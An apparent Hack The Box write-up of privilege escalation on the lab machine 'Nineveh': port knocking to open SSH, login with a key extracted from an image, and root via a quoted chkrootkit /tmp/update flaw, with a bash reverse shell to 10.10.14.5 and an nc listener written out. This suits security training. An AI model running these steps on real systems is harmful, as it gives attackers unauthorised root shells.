# Privilege Escalation

## amrois

- We can now run linpeas.sh, and we can see that ssh is locally listening but our nmap scan from [[Nineveh/05 - Enumeration#Nmap]] didn't give us an open port.
- Checking /etc we can see a knockd configuration, which is a tool for port knocking.
```bash
www-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```
- So we can use nmap for this from our local machine.
```bash
sudo nmap -Pn -p 571,290,911 -sT --max-retries 0 10.10.10.43
[sudo] password for norman: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 04:23 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown
571/tcp filtered umeter
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

```
- We can run nmap again against ssh and see it is open
```bash
sudo nmap -Pn -p 22 --max-retries 0 10.10.10.43             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 04:24 EDT
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.18s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

```
- We also had an image in secure_notes directory under the https://10.10.10.43.
- It was an image. We can run strings on the image to find private and public ssh keys for amrois present.
- We can login as amrois using the private key
```bash
ssh -i nineveh amrois@10.10.10.43                                                                                 
                                          130 ↵                                                                       
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.                                            
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.                                          
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                              
Warning: Permanently added '10.10.10.43' (ECDSA) to the list of known hosts.
Ubuntu 16.04.2 LTS                                         
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ ls
```
- Cat out the user.txt

## root
- Run linpeas again, and we can see that /reports is present in the root directoru, which shouldn't be, and reports are being generated every minute.
- (Saw this part in ippsec's video) Create a script which can detect commands being run, thus giving us the information that /usr/bin/chkrootkit is being run by root.
- Checking for it searchsploit 
```text

...[snip]...
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.


Suggested fix: Put quotation marks around the assignment.
...[snip]...

```
- So we can just create a file called update in /tmp. 
- Edit the file to put a reverse shell code in it.
```bash
amrois@nineveh:/tmp$ cat update
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.5/9003 0>&1'

```
- `chmod +x update`
- Open a listener on the local machine, we will get a connection from root in the next minute mark.
```bash
╭─norman@kali ~/Hack-The-Box/machines/nineveh/ssh ‹main*› 
╰─$ nc -lnvp 9003                                                                                                 1 ↵
listening on [any] 9003 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 57406
bash: cannot set terminal process group (6090): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@nineveh:~# ^Z
```